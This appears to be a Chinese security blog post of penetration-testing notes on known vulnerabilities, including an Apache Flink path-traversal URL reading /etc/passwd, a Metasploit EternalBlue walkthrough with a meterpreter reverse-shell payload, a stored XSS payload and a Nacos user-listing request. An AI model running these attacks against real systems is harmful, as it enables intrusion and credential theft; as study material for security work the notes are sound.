---
layout: post
title:  安全信息泄露之未授权访问
categories: 安全知识
description:  zookeeper 未授权
keywords: 未授权
---

# 未授权类

# 信息泄露

## JetBrains .idea 项目路径未删除

例如：`https://IP地址/.idea/workspace.xml`

漏洞危害： 

它允许恶意黑客收集相关信息，这些信息可以在攻击生命周期的后期使用，以便在无法访问这些信息的情况下获得更多。

修复建议：

删除该路径。

# CVE-2019-0708 BlueKeep远程桌面代码执行漏洞


漏洞详情：

当未经验证的攻击者使用RDP连接到目标系统并发送精心编制的请求时，远程桌面服务（以前称为终端服务）中存在远程代码执行漏洞。此漏洞是预验证漏洞，不需要用户交互。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。然后，攻击者可以安装程序；查看、更改或删除数据；或者创建具有完全用户权限的新帐户。
要利用此漏洞，攻击者需要通过RDP向目标系统远程桌面服务发送精心编制的请求。

漏洞危害：

成功利用此漏洞的攻击者可以在目标系统上执行任意代码。

# CVE-2021-21985 VMware vCenter Server 远程代码执行

# Apache 任意文件读取 (CVE-2020-17519)

例如：
```
http://<IP地址>:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
```

# 用友nc任意文件上传漏洞

1. [用友NC-OA漏洞合集](https://github.com/asdasdqkq1/yonyou-nc-exp)
2. Liquan 连接木马


# ms17-010（Eternal blue永恒之蓝）

使用 msf 工具攻击

```
msfconsole 
# options 和 payload 设置如下
msf > use exploit/windows/smb/ms17_010_eternalblue (加载攻击模块)
msf > set RHOST 192.168.92.129（被攻击机IP）
msf >set LHOST 192.168.92.132（设置本地IP）
msf >set LPORT 4444(设置连接端口)
msf >set payload windows/x64/meterpreter/reverse_tcp（配置回链方式）

msf >show options(查看配置相关信息)
msf >run（或者exploit,开始攻击）

四、    攻击成功！查看系统信息
meterpreter>sysinfo 爆出系统信息
meterpreter>screenshot 截屏，截屏后的图片存放在/root/中
meterpreter>net user 查看用户密码

```

# MySQL JDBC反序列化漏洞

[MySQL JDBC反序列化漏洞案例
](https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

发现方法：
发现后台中有数据库连接功能，经过测试使用的jdk版本较低，可进行jdbc反序列化漏洞。
在服务器上搭建恶意的mysql服务器，之后使用数据库连接功能连接恶意的mysql服务器，成功读取到/etc/host文件：

# 存储型XSS漏洞

- 超链接插入、图片插入
  ```
  "><img src=1 onerror=alter(1)>
  ```

# 版本泄露漏洞

- nginx 报错无屏蔽版本

# Windows Print Spooler服务最新漏洞CVE-2021-34527详细分析

https://blog.csdn.net/weixin_45728976/article/details/118612863

# windows CVE-2019-0708 漏洞利用复现

https://www.freebuf.com/articles/system/269901.html

0x00漏洞概述:

Windows系列服务器于2019年5月15号，被爆出高危漏洞，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的，堪比WannaCry(蠕虫病毒)。

0x01影响版本:

Windows 7

Windows Server 2008 R2

Windows Server 2008

Windows Server 2003

Windows XP

# Struts 远程代码执行漏洞(CVE-2016-1000031)

Struts2 是Apache软件基金会负责维护的一个基于MVC设计模式的Web应用框架开源项目。 
Apache Struts 2.3.36及之前的版本使用了Commons FileUpload 1.3.2及以下版本，该库作为Struts2的一部分，被用作文件上传的默认机制，该上传机制存在一个高危漏洞，远程攻击者可以利用该漏洞获得远程代码执行能力。

https://www.zerodayinitiative.com/advisories/ZDI-16-570/

https://www.cnblogs.com/peace-and-romance/p/15652512.html

# Hadoop Yarn REST API 未授权漏洞

https://developer.aliyun.com/article/824738

# Nacos 未授权漏洞复现

[Nacos 未授权漏洞复现
](https://www.programminghunter.com/article/25592048521/)
```dotnetcli
get方式获得其他用户信息：

GET /nacos/v1/auth/users?pageNo=1&pageSize=999 HTTP/1.1
Host: XXX
User-Agent: Nacos-Server
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip
```

# F5 漏洞-CVE-2021-22986 F5 BIG-IP 远程代码执行漏洞复现

[CVE-2021-22986
](https://www.freebuf.com/vuls/266971.html)